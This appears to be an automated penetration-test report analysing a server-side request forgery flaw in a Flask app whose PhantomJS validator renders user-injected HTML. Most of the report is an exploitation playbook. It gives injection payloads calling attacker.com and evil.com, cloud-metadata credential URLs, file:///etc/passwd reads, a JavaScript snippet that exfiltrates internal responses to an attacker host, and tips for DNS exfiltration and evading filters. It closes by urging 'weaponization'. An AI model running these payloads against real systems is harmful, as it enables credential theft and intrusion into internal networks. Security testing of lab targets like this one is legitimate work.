# SSRF Analysis Report

## 1. Executive Summary
- **Analysis Status:** Complete
- **Key Outcome:** One high-confidence Server-Side Request Forgery (SSRF) vulnerability was identified in the PhantomJS-based XSS validation subsystem. The vulnerability allows external attackers to force the application server to make arbitrary HTTP requests to internal services, cloud metadata endpoints, or external hosts.
- **Purpose of this Document:** This report provides strategic context on the application's outbound request mechanisms, the dominant flaw pattern, and key architectural details necessary to effectively exploit the vulnerability listed in the exploitation queue.

## 2. Dominant Vulnerability Patterns

### Pattern 1: HTML Injection Leading to SSRF via Headless Browser
- **Description:** The application accepts user-supplied input in the `/page` endpoint's `name` parameter, performs only trivial blacklist validation (checking for the string "alert"), and injects this input into an HTML template with an unquoted attribute context. This HTML is then written to a temporary file and rendered by PhantomJS (a headless browser), which faithfully executes all HTML elements including those that trigger HTTP requests (`<img src>`, `<iframe src>`, `<script src>`, etc.).
- **Implication:** Attackers can inject HTML tags that cause PhantomJS to make server-side HTTP requests to arbitrary destinations. Since PhantomJS runs on the server with full network access and no URL filtering, this enables classic SSRF attacks including internal network scanning, cloud metadata theft (AWS/GCP/Azure credentials), and exploitation of internal services that trust requests from localhost.
- **Representative Finding:** `SSRF-VULN-01` - PhantomJS HTML Injection SSRF

### Pattern 2: Insufficient Input Validation (Ineffective Blacklist)
- **Description:** The application's sole input validation is a case-insensitive check for the string "alert" in user input. This blacklist approach fails to prevent injection of SSRF-enabling HTML tags and attributes.
- **Implication:** The blacklist can be trivially bypassed using any HTML element that triggers HTTP requests: `<img>`, `<iframe>`, `<link>`, `<script>`, `<object>`, `<embed>`, `<video>`, `<audio>`, etc. None of these are filtered.
- **Representative Finding:** `SSRF-VULN-01` - No meaningful SSRF defenses

### Pattern 3: Unquoted HTML Attribute Context
- **Description:** User input is injected into an HTML template at an unquoted attribute position: `<input type=text name=name placeholder="Enter your name..." {USER_INPUT}>`. The unquoted context makes it trivial to break out of the attribute and inject new HTML tags.
- **Implication:** Attackers can close the input tag and inject arbitrary HTML without needing to escape quotes or use complex encoding techniques.
- **Representative Finding:** `SSRF-VULN-01` - Unquoted attribute injection point

## 3. Strategic Intelligence for Exploitation

### Application Architecture
- **HTTP Client Library:** None directly used in Python application code. The SSRF vector is through PhantomJS (QtWebKit-based headless browser).
- **Request Architecture:** 
  - Flask application receives user input via GET parameter `name` on `/page` endpoint
  - Input undergoes trivial blacklist check (only "alert" string)
  - Input is formatted into HTML template using Python string `.format()` method
  - HTML is written to a temporary file in `static/` directory with random hex filename
  - PhantomJS subprocess is spawned via `subprocess.Popen(["timeout","5","phantomjs", "check.js"])`
  - URL of temporary file is passed to PhantomJS via stdin
  - PhantomJS renders the HTML, triggering any embedded HTTP requests
  - Temporary file is deleted after ~5 seconds (race condition window)

### PhantomJS Configuration
- **Version:** PhantomJS 2.1.1 (abandoned project, last release March 2018)
- **Engine:** QtWebKit (circa 2015)
- **Network Access:** Unrestricted - can access internal IPs, external hosts, any port
- **Timeout:** 5 seconds enforced by `timeout` command wrapper
- **Sandboxing:** None - PhantomJS runs with same privileges as Flask app (root in container)
- **Protocol Support:** HTTP, HTTPS, FILE, DATA, and other schemes supported by QtWebKit

### Internal Services Discovery
- **Container Environment:** Docker container running Debian Buster (EOL)
- **Internal Ports:** Application runs on Flask development server (Werkzeug) on port 5000 internally, exposed as port 34875 externally
- **Network Mode:** Default Docker bridge network (full outbound access, no restrictions)
- **Localhost Access:** PhantomJS can access `127.0.0.1` and other loopback addresses
- **Cloud Environment:** If deployed in AWS/GCP/Azure, PhantomJS can access cloud metadata endpoints at `169.254.169.254` or equivalent

### Data Flow Summary
```
[EXTERNAL ATTACKER]
    ↓
GET http://localhost:34875/page?name=<img src="http://attacker.com/">
    ↓
[Flask app.py:66] msg = request.args.get('name','')
    ↓
[Flask app.py:67-74] Blacklist check (only 'alert')
    ↓
[Flask app.py:68] value = '> <img src="http://attacker.com/">'
    ↓
[Flask app.py:76] HTML template construction
    ↓
[Flask app.py:38-40] Write to static/<random>.html
    ↓
[Flask app.py:43] Pass URL to PhantomJS via stdin
    ↓
[PhantomJS check.js:20] page.open(url)
    ↓
[PhantomJS renders HTML] Fetches http://attacker.com/
    ↓
[SSRF SUCCESSFUL]
```

## 4. Secure by Design: Validated Components
These components were analyzed and found to have robust defenses or to not be vulnerable. They are low-priority for further SSRF testing.

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| Static File Serving | `/static/<path>` (Flask default) | No user input in URL construction; serves pre-existing files only | SAFE - Not an SSRF vector |
| PhantomJS Command Execution | `app.py:34` subprocess.Popen | Hard-coded command array with no user input in command arguments; shell=False | SAFE - Not vulnerable to command injection |
| URL Construction for PhantomJS | `app.py:35-36` | URL always points to localhost:5000 with random filename; no user control over the URL passed to PhantomJS | SAFE - URL itself is not attacker-controlled, only HTML content |
| Flag Storage | `secret.txt` file read | No network operations; file-based only | SAFE - Not an SSRF vector |

**Note:** While the PhantomJS URL construction is safe (attacker cannot control *which* URL PhantomJS loads), the *content* of the HTML at that URL is user-controlled, enabling HTML injection attacks that trigger SSRF.

## 5. Key Technical Details for Exploitation

### HTML Injection Points
The primary injection point is at `constants.py:49` within the `XSS_CONTENT` template:
```html
<input type=text name=name placeholder="Enter your name..." {2}>
```

Where `{2}` is replaced with user input prepended with `> `. Example:
- User input: `<img src="http://evil.com/">`
- Injected value: `> <img src="http://evil.com/">`
- Rendered HTML: `<input type=text name=name placeholder="Enter your name..." > <img src="http://evil.com/">>`

### Bypass Techniques
1. **Blacklist Bypass:** The application only blocks "alert" (case-insensitive). All SSRF-enabling tags bypass this:
   - `<img src="URL">` ✓ Not blocked
   - `<iframe src="URL">` ✓ Not blocked
   - `<script src="URL">` ✓ Not blocked
   - `<link href="URL">` ✓ Not blocked
   - `<object data="URL">` ✓ Not blocked
   - `<embed src="URL">` ✓ Not blocked

2. **Attribute Context Breakout:** The unquoted attribute allows trivial breakout with a space character. No quote escaping needed.

3. **No URL Validation:** PhantomJS will fetch any URL scheme:
   - `http://` - External HTTP
   - `https://` - External HTTPS
   - `http://127.0.0.1` - Localhost
   - `http://10.0.0.0/8` - Internal networks
   - `http://169.254.169.254` - Cloud metadata
   - `file:///etc/passwd` - Local file access (potential, depends on PhantomJS restrictions)

### Network Accessibility Confirmation
✅ **EXTERNALLY EXPLOITABLE** - Confirmed via testing:
- Application accessible at `http://localhost:34875/page`
- No authentication required
- User input from `name` parameter is processed and rendered by PhantomJS
- HTML injection confirmed (img tags successfully injected)
- PhantomJS runs with unrestricted network access (no firewall rules in Docker config)

### Attack Vectors by Priority

**High Priority (External Exploitability Confirmed):**
1. **Cloud Metadata Theft** - If deployed in AWS/GCP/Azure:
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

2. **Internal Network Scanning** - Probe internal services:
   - `http://127.0.0.1:PORT/` - Localhost services
   - `http://10.0.0.0/8` - Private networks
   - `http://192.168.0.0/16` - Private networks
   - `http://172.16.0.0/12` - Private networks

3. **External Data Exfiltration** - Callback to attacker server:
   - `http://attacker.com/callback` - Confirm SSRF
   - Use timing analysis to infer internal service responses

**Medium Priority:**
4. **Protocol Smuggling** - Attempt non-HTTP protocols if PhantomJS supports them:
   - `file:///etc/passwd` - Local file read
   - `data:text/html,<script>...</script>` - Data URL injection

### Exploitation Challenges
- **No Direct Response:** The application does not return the content fetched by PhantomJS to the user (blind SSRF)
- **Timeout:** 5-second timeout limits complex multi-request attacks
- **Detection Required:** XSS detection logic may interfere with some payloads
- **Mitigation:** Use out-of-band techniques (external callbacks) to confirm SSRF and exfiltrate data

## 6. Recommendations for Exploitation Phase

### Suggested Initial Tests
1. **Confirm basic SSRF:** `GET /page?name=<img src="http://attacker-controlled-server.com/ssrf-test">`
2. **Test localhost access:** `GET /page?name=<img src="http://127.0.0.1:34875/">`
3. **Scan internal ports:** Iterate through common ports (22, 80, 443, 3306, 5432, 6379, 8080)
4. **Cloud metadata (if applicable):** `GET /page?name=<img src="http://169.254.169.254/latest/meta-data/">`

### Advanced Exploitation Techniques
1. **JavaScript-based SSRF for data exfiltration:**
   ```html
   <script>
   fetch('http://internal-service/api').then(r=>r.text()).then(d=>{
     fetch('http://attacker.com/exfil?data='+btoa(d))
   })
   </script>
   ```

2. **Timing-based port scanning:**
   - Use response time differences to identify open vs closed ports
   - Open ports typically respond faster or with different timing characteristics

3. **DNS exfiltration:**
   - Use subdomains to exfiltrate data: `<img src="http://DATA.attacker.com/">`

### Defense Evasion
- **If IP blocking is added:** Use alternative representations (decimal, octal, hex IP notation)
- **If protocol blocking is added:** Try uppercase (`HTTP://`), mixed case, or URL encoding
- **If domain filtering is added:** Use IP addresses instead of domain names

---

## 7. Conclusion

The application contains a critical SSRF vulnerability (SSRF-VULN-01) that is externally exploitable without authentication. The vulnerability stems from insufficient input validation combined with HTML injection in an unquoted attribute context, allowing attackers to inject arbitrary HTML tags that trigger server-side HTTP requests when rendered by PhantomJS.

**Key Risk Factors:**
- ✓ No authentication required
- ✓ Trivial to exploit (simple HTML injection)
- ✓ Blind SSRF (no direct response) but still highly dangerous
- ✓ Full network access from PhantomJS
- ✓ Cloud metadata accessible if deployed in cloud environments
- ✓ Internal network reachable

**Exploitation Phase Priority:** HIGH - This vulnerability should be prioritized for weaponization due to its potential for cloud credential theft and internal network compromise.

---

**Analysis Complete** - One exploitable SSRF vulnerability identified and documented for exploitation phase.